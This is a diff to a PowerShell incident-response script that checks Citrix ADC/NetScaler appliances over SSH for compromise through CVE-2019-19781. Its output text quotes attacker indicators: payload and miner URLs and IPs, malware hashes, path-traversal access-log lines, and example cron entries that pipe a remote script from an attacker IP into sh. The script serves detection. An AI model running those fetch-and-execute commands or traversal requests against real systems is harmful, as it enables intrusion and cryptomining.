@@ -823,6 +823,8 @@ Sources:
 - https://ctxpro.com/are-people-mining-bitcoin-on-your-netscaler-adc-using-cve-2019-19781/
 - http://deyda.net/index.php/en/2020/01/15/checklist-for-citrix-adc-cve-2019-19781/
 - https://www.trustedsec.com/blog/netscaler-honeypot/
+- https://isc.sans.edu/diary/Citrix+ADC+Exploits%3A+Overview+of+Observed+Payloads/25704
+- https://github.com/x1sec/CVE-2019-19781/blob/master/CVE-2019-19781-DFIR.md
 
 NOTE: The script is of my own and not the opinion of my employer!
 
@@ -830,8 +832,8 @@ NOTE: The script is of my own and not the opinion of my employer!
 "@
     try {    
         $SSHSession = New-SSHSession -ComputerName $ManagementURL.host -Credential $Credential
-        Write-Host -ForegroundColor White "SSC Connection to `"$($ManagementURL.host)`" Connected: $($SSHSession.Connected)`r`n"
-        Write-ToLogFile -I -C Connection -M "SSC Connection to `"$($ManagementURL.host)`" Connected: $($SSHSession.Connected)`r`n"
+        Write-Host -ForegroundColor White "SSH Connection to `"$($ManagementURL.host)`" Connected: $($SSHSession.Connected)`r`n"
+        Write-ToLogFile -I -C Connection -M "SSH Connection to `"$($ManagementURL.host)`" Connected: $($SSHSession.Connected)`r`n"
         $ShellCommand = 'show version'
         $Output = Invoke-SSHCommand -Index $($SSHSession.SessionId) -Command $ShellCommand -TimeOut $TimeOut
         $Versions = (CleanOutput -Data $Output.Output).Replace("`t", "") | Select-String -Pattern '[0-9]{2}.[0-9]{1,}' -AllMatches
@@ -844,55 +846,61 @@ NOTE: The script is of my own and not the opinion of my employer!
         Write-Host -ForegroundColor White "`r`nCurrent version $((CleanOutput -Data $Output.Output).Replace('`t', ''))`r`n"
         Write-ToLogFile -W -C Version -M "Current version $((CleanOutput -Data $Output.Output).Replace('`t', ''))"
 
+        $NewVersionText = $null
+        $NewVersionLink = $Null
+        if ((([version]$version).Major -eq 10) -and (([version]$version).Minor -eq 5) -and ([version]$version -lt [version]"10.5.70.12")) {
+            $NewVersionText = "New version (10.5 Build 70.12) for the vulnerability is available please upgrade as soon as possible!"
+            $NewVersionLink = "https://www.citrix.com/downloads/citrix-adc/firmware/release-105-build-70-12.html"
+        }
         if ((([version]$version).Major -eq 11) -and (([version]$version).Minor -eq 1) -and ([version]$version -lt [version]"11.1.63.15")) {
-            ""
-            Write-Warning "New version (11.1 Build 63.15) for the vulnerability is available please upgrade as soon as possible!"
-            Write-Warning "https://www.citrix.com/downloads/citrix-adc/firmware/release-111-build-6315.html"
-            Write-ToLogFile -W -C Version -M "New version (11.1 Build 63.15) for the vulnerability is available please upgrade as soon as possible!"
-            Write-ToLogFile -W -C Version -M "https://www.citrix.com/downloads/citrix-adc/firmware/release-111-build-6315.html"
-            ""
+            $NewVersionText = "New version (11.1 Build 63.15) for the vulnerability is available please upgrade as soon as possible!"
+            $NewVersionLink = "https://www.citrix.com/downloads/citrix-adc/firmware/release-111-build-6315.html"
         }
         if ((([version]$version).Major -eq 12) -and (([version]$version).Minor -eq 0) -and ([version]$version -lt [version]"12.0.63.13")) {
-            ""
-            Write-Warning "New version (12.0 Build 63.13) for the vulnerability is available please upgrade as soon as possible!"
-            Write-Warning "https://www.citrix.com/downloads/citrix-adc/firmware/release-120-build-6313.html"
-            Write-ToLogFile -W -C Version -M "New version (12.0 Build 63.13) for the vulnerability is available please upgrade as soon as possible!"
-            Write-ToLogFile -W -C Version -M "https://www.citrix.com/downloads/citrix-adc/firmware/release-120-build-6313.html"
-            ""
+            $NewVersionText = "New version (12.0 Build 63.13) for the vulnerability is available please upgrade as soon as possible!"
+            $NewVersionLink = "https://www.citrix.com/downloads/citrix-adc/firmware/release-120-build-6313.html"
         }
-
+        if ((([version]$version).Major -eq 12) -and (([version]$version).Minor -eq 1) -and ([version]$version -lt [version]"12.1.55.18")) {
+            $NewVersionText = "New version (12.1 Build 55.18) for the vulnerability is available please upgrade as soon as possible!"
+            $NewVersionLink = "https://www.citrix.com/downloads/citrix-adc/firmware/release-121-build-5518.html"
+        }
+        if ((([version]$version).Major -eq 13) -and (([version]$version).Minor -eq 0) -and ([version]$version -lt [version]"13.0.47.24")) {
+            $NewVersionText = "New version (13.0 Build 47.24) for the vulnerability is available please upgrade as soon as possible!"
+            $NewVersionLink = "https://www.citrix.com/downloads/citrix-adc/firmware/release-13-0-build-47-24.html"
+        }
         if ($version -like "12.1.*") {
             if ((($version -ne "12.1.50.31") -and ($version -ne "12.1.51.16")) -and (-Not ([version]$version -ge [version]"12.1.51.19"))) {
-                Write-Warning "You still might be vulnerable to CVE-2019-19781!"
-                Write-Warning "Upgrade to a version higher than 12.1 build 51.16"
+                Write-Warning "This Citrix ADC / NetScaler is extra vulnerable to CVE-2019-19781, as the mitigation can possibly not work correctly!"
                 Write-ToLogFile -W -C Version -M "You still might be vulnerable to CVE-2019-19781!"
-                Write-ToLogFile -W -C Version -M "Upgrade to a version higher than 12.1 build 51.16"
-            } else {
-                Write-Host "Citrix ADC / NetScaler version OK"
-                Write-ToLogFile -I -C Version -M "Citrix ADC / NetScaler version OK"
-
-            }
+            } 
+        }
+        if (-Not ([String]::IsNullOrEmpty($NewVersionText))) {
+            ""
+            Write-Warning $NewVersionText
+            Write-Warning $NewVersionLink
+            Write-ToLogFile -W -C Version -M $NewVersionText
+            Write-ToLogFile -W -C Version -M $NewVersionLink
+            ""
         } else {
             Write-Host -ForegroundColor Green "Citrix ADC / NetScaler version OK"
             Write-ToLogFile -I -C Version -M "Citrix ADC / NetScaler version OK"
         }
-
         $badips = @"
-Lookout for the following IP's and scipts. These are indications of a hack.
-hxxp://185.178.45.221/ci2.sh
-hxxp://62.113.112.33/ci.sh
-hxxp://185.178.45.221/ci.sh
-Miner:
-hxxp://217.12.221.12/netscalerd
-193.187.174.104
-359328.selcdn.ru
-188.120.254.224
-46.229.215.164
-62.113.112.127
-0e431d0d9e0fc371c163e4de5226c50b – ci.sh
-5be9abbe208a1e03ef3def7f9fa816d3 – netscalerd
-568f7b1d6c2239e208ba97886acc0b1e – nspps
-1c8c28e4db5ad7773da363146b10a340
+Lookout for the following IP's and scipts. These are indications of a hack.`r
+hxxp://185.178.45.221/ci2.sh`r
+hxxp://62.113.112.33/ci.sh`r
+hxxp://185.178.45.221/ci.sh`r
+Miner:`r
+hxxp://217.12.221.12/netscalerd`r
+193.187.174.104`r
+359328.selcdn.ru`r
+188.120.254.224`r
+46.229.215.164`r
+62.113.112.127`r
+0e431d0d9e0fc371c163e4de5226c50b – ci.sh`r
+5be9abbe208a1e03ef3def7f9fa816d3 – netscalerd`r
+568f7b1d6c2239e208ba97886acc0b1e – nspps`r
+1c8c28e4db5ad7773da363146b10a340`r
         
 "@
         Write-Host -ForegroundColor Green  "`r`n$badips"
@@ -937,20 +945,20 @@ hxxp://217.12.221.12/netscalerd
         Write-ToLogFile -I -C $null -M "Attempts to exploit the system leave traces in the Apache httpaccess log files"
 
         $Example = @"
-INFO: Message like the following can indicate a successful hack attempt:
+INFO: Message like the following can indicate a successful hack attempt:`r
 
-193.187.174.104 - - [12/Jan/2020:11:26:02 +0000] "GET /vpn/../vpns/cfg/smb.conf HTTP/1.1" 200 83 "-"
-193.187.174.104 - - [12/Jan/2020:11:26:03 +0000] "POST /vpn/../vpns/portal/scripts/newbm.pl HTTP/1.1" 200 15 "-"
-193.187.174.104 - - [12/Jan/2020:11:26:04 +0000] "POST /vpn/../vpns/portal/scripts/newbm.pl HTTP/1.1" 200 15 "-"
-193.187.174.104 - - [12/Jan/2020:11:26:05 +0000] "POST /vpn/../vpns/portal/scripts/newbm.pl HTTP/1.1" 200 15 "-"
-193.187.174.104 - - [12/Jan/2020:11:26:11 +0000] "GET /vpn/../vpns/portal/AOUnCfwrjIJrpngpwLXHddqADAxTraBan.xml HTTP/1.1" 200 - "-"
+193.187.174.104 - - [12/Jan/2020:11:26:02 +0000] "GET /vpn/../vpns/cfg/smb.conf HTTP/1.1" 200 83 "-"`r
+193.187.174.104 - - [12/Jan/2020:11:26:03 +0000] "POST /vpn/../vpns/portal/scripts/newbm.pl HTTP/1.1" 200 15 "-"`r
+193.187.174.104 - - [12/Jan/2020:11:26:04 +0000] "POST /vpn/../vpns/portal/scripts/newbm.pl HTTP/1.1" 200 15 "-"`r
+193.187.174.104 - - [12/Jan/2020:11:26:05 +0000] "POST /vpn/../vpns/portal/scripts/newbm.pl HTTP/1.1" 200 15 "-"`r
+193.187.174.104 - - [12/Jan/2020:11:26:11 +0000] "GET /vpn/../vpns/portal/AOUnCfwrjIJrpngpwLXHddqADAxTraBan.xml HTTP/1.1" 200 - "-"`r
 
 "@       
         Write-Host -ForegroundColor Green  $Example
         Write-ToLogFile -I -C Example -M $Example
 
-        Write-Host -ForegroundColor White  "Checking Apache httpaccess log files"
-        Write-ToLogFile -I -C $null -M "Checking Apache httpaccess log files"
+        Write-Host -ForegroundColor White  "Checking Apache httpaccess log files. NOTE: size 100 = 100KB. Files are rotated hourly."
+        Write-ToLogFile -I -C $null -M "Checking Apache httpaccess log files. NOTE: size 100 = 100KB. Files are rotated hourly."
 
         $ShellCommand = 'shell cat /var/log/httpaccess.log | grep vpns | grep xml'
         $Output = Invoke-SSHCommand -Index $($SSHSession.SessionId) -Command $ShellCommand -TimeOut $TimeOut
@@ -1062,19 +1070,19 @@ INFO: Message like the following can indicate a successful hack attempt:
 
         $Normal = @"
 
-SHELL=/bin/sh
-PATH=/netscaler:/etc:/bin:/sbin:/usr/bin:/usr/sbin
-HOME=/var/log
-#minute hour    mday    month   wday    who     command
-0       *       *       *       *       root    newsyslog
-0       0       *       *       *       root    purge_tickets.sh
-#
-# time zone change adjustment for wall cmos clock,
-# does nothing, if you have UTC cmos clock.
-# See adjkerntz(8) for details.
-1,31    0-5     *       *       *       root    adjkerntz -a
-*       *       *       *       *       root    nsfsyncd -p
-49       0-23       *       *       *       root    nslog.sh dozip
+SHELL=/bin/sh`r
+PATH=/netscaler:/etc:/bin:/sbin:/usr/bin:/usr/sbin`r
+HOME=/var/log`r
+#minute hour    mday    month   wday    who     command`r
+0       *       *       *       *       root    newsyslog`r
+0       0       *       *       *       root    purge_tickets.sh`r
+#`r
+# time zone change adjustment for wall cmos clock,`r
+# does nothing, if you have UTC cmos clock.`r
+# See adjkerntz(8) for details.`r
+1,31    0-5     *       *       *       root    adjkerntz -a`r
+*       *       *       *       *       root    nsfsyncd -p`r
+49       0-23       *       *       *       root    nslog.sh dozip`r
 
 "@
 
@@ -1093,45 +1101,45 @@ HOME=/var/log
         if (([version]$version).Major -eq 13) {
             $Normal = @"
 
-# `$FreeBSD: release/8.4.0/etc/master.passwd 243948 2012-12-06 11:54:25Z rwatson $
-#
-root:*:0:0:Charlie &:/root:/usr/bin/bash
-nsroot:*:0:0:Netscaler Root:/root:/netscaler/nssh
-daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin
-operator:*:2:5:System &:/:/usr/sbin/nologin
-bin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin
-tty:*:4:65533:Tty Sandbox:/:/usr/sbin/nologin
-kmem:*:5:65533:KMem Sandbox:/:/usr/sbin/nologin
-games:*:7:13:Games pseudo-user:/usr/games:/usr/sbin/nologin
-news:*:8:8:News Subsystem:/:/usr/sbin/nologin
-man:*:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin
-sshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin
-smmsp:*:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin
-mailnull:*:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin
-bind:*:53:53:Bind Sandbox:/:/usr/sbin/nologin
-proxy:*:62:62:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin
-_pflogd:*:64:64:pflogd privsep user:/var/empty:/usr/sbin/nologin
-_dhcp:*:65:65:dhcp programs:/var/empty:/usr/sbin/nologin
-uucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/sbin/nologin
-pop:*:68:6:Post Office Owner:/nonexistent:/usr/sbin/nologin
-auditdistd:*:78:77:Auditdistd unprivileged user:/var/empty:/usr/sbin/nologin
-www:*:80:80:World Wide Web Owner:/nonexistent:/usr/sbin/nologin
-hast:*:845:845:HAST unprivileged user:/var/empty:/usr/sbin/nologin
-nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin
-nsmonitor:*:65532:65534:Netscaler Monitoring user:/var/nstmp/monitors:/usr/sbin/nologin
+# `$FreeBSD: release/8.4.0/etc/master.passwd 243948 2012-12-06 11:54:25Z rwatson $`r
+#`r
+root:*:0:0:Charlie &:/root:/usr/bin/bash`r
+nsroot:*:0:0:Netscaler Root:/root:/netscaler/nssh`r
+daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin`r
+operator:*:2:5:System &:/:/usr/sbin/nologin`r
+bin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin`r
+tty:*:4:65533:Tty Sandbox:/:/usr/sbin/nologin`r
+kmem:*:5:65533:KMem Sandbox:/:/usr/sbin/nologin`r
+games:*:7:13:Games pseudo-user:/usr/games:/usr/sbin/nologin`r
+news:*:8:8:News Subsystem:/:/usr/sbin/nologin`r
+man:*:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin`r
+sshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin`r
+smmsp:*:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin`r
+mailnull:*:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin`r
+bind:*:53:53:Bind Sandbox:/:/usr/sbin/nologin`r
+proxy:*:62:62:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin`r
+_pflogd:*:64:64:pflogd privsep user:/var/empty:/usr/sbin/nologin`r
+_dhcp:*:65:65:dhcp programs:/var/empty:/usr/sbin/nologin`r
+uucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/sbin/nologin`r
+pop:*:68:6:Post Office Owner:/nonexistent:/usr/sbin/nologin`r
+auditdistd:*:78:77:Auditdistd unprivileged user:/var/empty:/usr/sbin/nologin`r
+www:*:80:80:World Wide Web Owner:/nonexistent:/usr/sbin/nologin`r
+hast:*:845:845:HAST unprivileged user:/var/empty:/usr/sbin/nologin`r
+nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin`r
+nsmonitor:*:65532:65534:Netscaler Monitoring user:/var/nstmp/monitors:/usr/sbin/nologin`r
 
 "@
         } else {
             $Normal = @"
 
-root:*:0:0:Charlie &:/root:/usr/bin/bash
-nsroot:*:0:0:Netscaler Root:/root:/netscaler/nssh
-daemon:*:1:1:Owner of many system processes:/root:/nonexistent
-operator:*:2:20:System &:/nonexistent:/nonexistent
-bin:*:3:7:Binaries Commands and Source,,,:/:/nonexistent
-nobody:*:65534:65534:Unprivileged user:/nonexistent:/nonexistent
-sshd:*:65533:65533:SSHD User:/nonexistent:/nonexistent
-nsmonitor:*:65532:65534:Netscaler Monitoring user:/var/nstmp/monitors:/nonexistent
+root:*:0:0:Charlie &:/root:/usr/bin/bash`r
+nsroot:*:0:0:Netscaler Root:/root:/netscaler/nssh`r
+daemon:*:1:1:Owner of many system processes:/root:/nonexistent`r
+operator:*:2:20:System &:/nonexistent:/nonexistent`r
+bin:*:3:7:Binaries Commands and Source,,,:/:/nonexistent`r
+nobody:*:65534:65534:Unprivileged user:/nonexistent:/nonexistent`r
+sshd:*:65533:65533:SSHD User:/nonexistent:/nonexistent`r
+nsmonitor:*:65532:65534:Netscaler Monitoring user:/var/nstmp/monitors:/nonexistent`r
 
 "@
         }
@@ -1161,10 +1169,10 @@ nsmonitor:*:65532:65534:Netscaler Monitoring user:/var/nstmp/monitors:/nonexiste
         Write-ToLogFile -I -C $null -M "Check if users have cron jobs assigned."
         Write-Host -ForegroundColor Green @"
         
-Lookout for cron jobs like:" 
-
-* * * * * curl http://185.178.45.221/ci.sh | sh > /dev/null 2>&1
-* * * * * curl http://62.113.112.33/ci.sh | sh > /dev/null 2>&1
+Lookout for cron jobs like:`r
+`r
+* * * * * curl http://185.178.45.221/ci.sh | sh > /dev/null 2>&1`r
+* * * * * curl http://62.113.112.33/ci.sh | sh > /dev/null 2>&1`r
 
 "@
         ForEach ($User in $Users) {
@@ -1178,8 +1186,8 @@ Lookout for cron jobs like:"
     
         $Normal = @"
 
-root      12507  0.0  0.5 36972  7800  ??  Rs    9:32AM   0:00.06 nscli shell ps -aux | grep python \n
-root      12508  0.0  0.1  9096  1344  ??  S     9:32AM   0:00.00 grep python
+root      12507  0.0  0.5 36972  7800  ??  Rs    9:32AM   0:00.06 nscli shell ps -aux | grep python \n`r
+root      12508  0.0  0.1  9096  1344  ??  S     9:32AM   0:00.00 grep python`r
 
 "@
         Write-Host -ForegroundColor White "`r`npython scripts"
@@ -1197,11 +1205,11 @@ root      12508  0.0  0.1  9096  1344  ??  S     9:32AM   0:00.00 grep python
 
         $Normal = @"
 
-nsmonitor 75080  3.2  0.7 39092 12104  ??  S    Sun11AM 189:08.67 /usr/bin/perl -w /netscaler/monitors/nsldap.pl base=dc=domain,dc=local;bdn=svc_ldapread@domain.local;password=**********;
-nsmonitor 19865  2.3  0.9 39092 14404  ??  S    Mon06PM  75:45.64 /usr/bin/perl -w /netscaler/monitors/nsldap.pl base=dc=domain,dc=local;bdn=svc_ldapread@domain.local;password=**********;
-nsmonitor  1510  0.0  0.5 36188  7828  ??  S     1Jan20   5:04.00 /usr/bin/perl -w /netscaler/monitors/nssf.pl acctservice=0;storename=Store;backendserver=0;
-root      12510  0.0  0.5 36972  7800  ??  Rs    9:32AM   0:00.06 nscli shell ps -aux | grep perl \n
-root      12511  0.0  0.1  9096  1348  ??  S     9:32AM   0:00.00 grep perl
+nsmonitor 75080  3.2  0.7 39092 12104  ??  S    Sun11AM 189:08.67 /usr/bin/perl -w /netscaler/monitors/nsldap.pl base=dc=domain,dc=local;bdn=svc_ldapread@domain.local;password=**********;`r
+nsmonitor 19865  2.3  0.9 39092 14404  ??  S    Mon06PM  75:45.64 /usr/bin/perl -w /netscaler/monitors/nsldap.pl base=dc=domain,dc=local;bdn=svc_ldapread@domain.local;password=**********;`r
+nsmonitor  1510  0.0  0.5 36188  7828  ??  S     1Jan20   5:04.00 /usr/bin/perl -w /netscaler/monitors/nssf.pl acctservice=0;storename=Store;backendserver=0;`r
+root      12510  0.0  0.5 36972  7800  ??  Rs    9:32AM   0:00.06 nscli shell ps -aux | grep perl \n`r
+root      12511  0.0  0.1  9096  1348  ??  S     9:32AM   0:00.00 grep perl`r
 
 "@
         Write-Host -ForegroundColor White "`r`nperl scripts"
@@ -1219,12 +1227,12 @@ root      12511  0.0  0.1  9096  1348  ??  S     9:32AM   0:00.00 grep perl
 
         $Normal = @"
 
-nobody    34839  0.0  0.5 114288 38836  ??  S     6:00PM   0:01.73 | |-- /bin/httpd
-nobody    34840  0.0  0.5 114288 38892  ??  S     6:00PM   0:01.86 | |-- /bin/httpd
-nobody    34841  0.0  0.5 120468 43084  ??  S     6:00PM   0:01.34 | |-- /bin/httpd
-nobody    34842  0.0  0.5 120432 41764  ??  S     6:00PM   0:00.67 | |-- /bin/httpd
-nobody    34843  0.0  0.4 114088 34608  ??  I     6:00PM   0:00.00 | `-- /bin/httpd
-root      38520  0.0  0.0  9096  1432   0  S+    8:22PM   0:00.00 |     |-- grep nobody
+nobody    34839  0.0  0.5 114288 38836  ??  S     6:00PM   0:01.73 | |-- /bin/httpd`r
+nobody    34840  0.0  0.5 114288 38892  ??  S     6:00PM   0:01.86 | |-- /bin/httpd`r
+nobody    34841  0.0  0.5 120468 43084  ??  S     6:00PM   0:01.34 | |-- /bin/httpd`r
+nobody    34842  0.0  0.5 120432 41764  ??  S     6:00PM   0:00.67 | |-- /bin/httpd`r
+nobody    34843  0.0  0.4 114088 34608  ??  I     6:00PM   0:00.00 | `-- /bin/httpd`r
+root      38520  0.0  0.0  9096  1432   0  S+    8:22PM   0:00.00 |     |-- grep nobody`r
 
 "@
         Write-Host -ForegroundColor White "`r`nRunning processes for nobody"
@@ -1260,9 +1268,9 @@ root      38520  0.0  0.0  9096  1432   0  S+    8:22PM   0:00.00 |     |-- grep
         Write-Host -ForegroundColor Yellow "$(CleanOutput -Data $Output.Output | Out-String)"
         Write-ToLogFile -I -C Output -M "`r`n$(CleanOutput -Data $Output.Output | Out-String)"
 
-        Write-Host -ForegroundColor White "`r`nChanges on the Citrix ADC / NetScaler since 01-01-2020. Analyse for unknown changes."
-        Write-ToLogFile -I -C $null -M "Changes on the Citrix ADC / NetScaler since 01-01-2020. Analyse for unknown changes."
-        $ShellCommand = 'shell (find /netscaler -newermt "2020-01-01" -type f -print0 | xargs -0 /bin/ls -ltr)'
+        Write-Host -ForegroundColor White "`r`nChanges on the Citrix ADC / NetScaler filesystem since 01-01-2020. Analyze for unknown changes. (Reboot and upgrade may also change files)"
+        Write-ToLogFile -I -C $null -M "Changes on the Citrix ADC / NetScaler filesystem since 01-01-2020. Analyze for unknown changes. (Reboot and upgrade may also change files)"
+        $ShellCommand = 'shell (find / -newermt "2020-01-01" -not -path "/proc/*" -type f -print0 | xargs -0 /bin/ls -ltr)'
         $Output = Invoke-SSHCommand -Index $($SSHSession.SessionId) -Command $ShellCommand -TimeOut $TimeOut
         Write-Host -ForegroundColor White "`r`nCommand Executed: '$ShellCommand':"
         Write-ToLogFile -I -C Command -M "Command Executed: '$ShellCommand':"
@@ -1271,35 +1279,37 @@ root      38520  0.0  0.0  9096  1432   0  S+    8:22PM   0:00.00 |     |-- grep
         
         $normal = @"
 
-NetScaler v11.1:
-MD5 (/netscaler/portal/scripts/PersonalBookmark.pl) = d45a1c4924170e2c398831676a3b8102
-MD5 (/netscaler/portal/scripts/logout.pl) = 2a2b40bfdedfc8b4ba56c280994d8d37
-MD5 (/netscaler/portal/scripts/navthemes.pl) = 9926d0a20e179756daeb4688c8a03b37
-MD5 (/netscaler/portal/scripts/newbm.pl) = 0591c29843bc5a48368ed06c23a3733a
-MD5 (/netscaler/portal/scripts/picktheme.pl) = 575f21c82bd84aa458466e0c378d9abc
-MD5 (/netscaler/portal/scripts/rmbm.pl) = 85b99d94aa01718e1ce830cd86c2d2ff
-MD5 (/netscaler/portal/scripts/savecolorprefs.pl) = b7d799e6c6a293de2fd42e524ea44e62
-MD5 (/netscaler/portal/scripts/subscription.pl) = bb959a65984bad31acd925312d12de8f
-MD5 (/netscaler/portal/scripts/themes.pl) = 5fcb189ac8c557ab1d956e612dae0a05
-MD5 (/netscaler/portal/scripts/tips.pl) = 3280ba3ab11a34077885f9de1beb1c92
+NetScaler v11.1:`r
+MD5 (/netscaler/portal/scripts/PersonalBookmark.pl) = d45a1c4924170e2c398831676a3b8102 or c09f01a0dd075423a0e1064220bf7ed6`r
+MD5 (/netscaler/portal/scripts/logout.pl) = 2a2b40bfdedfc8b4ba56c280994d8d37`r
+MD5 (/netscaler/portal/scripts/navthemes.pl) = 9926d0a20e179756daeb4688c8a03b37`r
+MD5 (/netscaler/portal/scripts/newbm.pl) = 0591c29843bc5a48368ed06c23a3733a or a0ff4d1c0f80af5455991c70149e8771`r
+MD5 (/netscaler/portal/scripts/picktheme.pl) = 575f21c82bd84aa458466e0c378d9abc a5a43db87155ab699704e6147e333fdc`r
+MD5 (/netscaler/portal/scripts/rmbm.pl) = 85b99d94aa01718e1ce830cd86c2d2ff or e72b4675f9b7fc1bc6eb8852f16b57a3`r
+MD5 (/netscaler/portal/scripts/savecolorprefs.pl) = b7d799e6c6a293de2fd42e524ea44e62`r
+MD5 (/netscaler/portal/scripts/subscription.pl) = bb959a65984bad31acd925312d12de8f or c594ba0df2e9fc323766ef35d4ff762f`r
+MD5 (/netscaler/portal/scripts/themes.pl) = 5fcb189ac8c557ab1d956e612dae0a05`r
+MD5 (/netscaler/portal/scripts/tips.pl) = 3280ba3ab11a34077885f9de1beb1c92`r
 
 "@
-        Write-Host -ForegroundColor White "`r`nValidate the file hashes of the perl scripts."
-        Write-ToLogFile -I -C $null -M "Validate the file hashes of the perl scripts."
+        Write-Host -ForegroundColor White "`r`nValidate the file hashes of the perl scripts. Check for files that dont belong here or have typo's."
+        Write-ToLogFile -I -C $null -M "Validate the file hashes of the perl scripts. Check for files that dont belong here or have typo's."
         Write-Host -ForegroundColor White "The following output is from a Non-Compromised system, please compare."
         Write-ToLogFile -I -C $null -M "The following output is from a Non-Compromised system, please compare."
         Write-Host -ForegroundColor Green $Normal
         Write-ToLogFile -I -C Example -M $Normal
+
         $ShellCommand = 'shell md5 /netscaler/portal/scripts/*'
         $Output = Invoke-SSHCommand -Index $($SSHSession.SessionId) -Command $ShellCommand -TimeOut $TimeOut
+
         Write-Host -ForegroundColor White "`r`nCommand Executed: '$ShellCommand':"
         Write-ToLogFile -I -C Command -M "Command Executed: '$ShellCommand':"
         Write-Host -ForegroundColor Yellow "$(CleanOutput -Data $Output.Output | Out-String)"
         Write-ToLogFile -I -C Output -M "`r`n$(CleanOutput -Data $Output.Output | Out-String)"
-
+       
         "`r`n`r`n"
         Write-Warning "There might be more/other errors!`r`nWhen in doubt manually view the log files with the following commands:`r`nshell cat /var/log/httperror.log`r`nshell gzcat /var/log/httperror.log.*.gz"
-        Write-ToLogFile -W -C Important-M "There might be more/other errors!"
+        Write-ToLogFile -W -C Important -M "There might be more/other errors!"
         Write-ToLogFile -W -C Important -M "When in doubt manually view the log files with the following commands:"
         Write-ToLogFile -W -C Important -M "shell cat /var/log/httperror.log"
         Write-ToLogFile -W -C Important -M "shell gzcat /var/log/httperror.log.*.gz"
@@ -1317,20 +1327,12 @@ MD5 (/netscaler/portal/scripts/tips.pl) = 3280ba3ab11a34077885f9de1beb1c92
             Write-ToLogFile -E -C Posh-SSH -M "Posh-SSH NOT disconnected."
         }
 
-        if ((([version]$version).Major -eq 11) -and (([version]$version).Minor -eq 1) -and ([version]$version -lt [version]"11.1.63.15")) {
+        if (-Not ([String]::IsNullOrEmpty($NewVersionText))) {
             ""
-            Write-Warning "New version (11.1 Build 63.15) for the vulnerability is available please upgrade as soon as possible!"
-            Write-Warning "https://www.citrix.com/downloads/citrix-adc/firmware/release-111-build-6315.html"
-            Write-ToLogFile -W -C Version -M "New version (11.1 Build 63.15) for the vulnerability is available please upgrade as soon as possible!"
-            Write-ToLogFile -W -C Version -M "https://www.citrix.com/downloads/citrix-adc/firmware/release-111-build-6315.html"
-            ""
-        }
-        if ((([version]$version).Major -eq 12) -and (([version]$version).Minor -eq 0) -and ([version]$version -lt [version]"12.0.63.13")) {
-            ""
-            Write-Warning "New version (12.0 Build 63.13) for the vulnerability is available please upgrade as soon as possible!"
-            Write-Warning "https://www.citrix.com/downloads/citrix-adc/firmware/release-120-build-6313.html"
-            Write-ToLogFile -W -C Version -M "New version (12.0 Build 63.13) for the vulnerability is available please upgrade as soon as possible!"
-            Write-ToLogFile -W -C Version -M "https://www.citrix.com/downloads/citrix-adc/firmware/release-120-build-6313.html"
+            Write-Warning $NewVersionText
+            Write-Warning $NewVersionLink
+            Write-ToLogFile -W -C Version -M $NewVersionText
+            Write-ToLogFile -W -C Version -M $NewVersionLink
             ""
         }
 
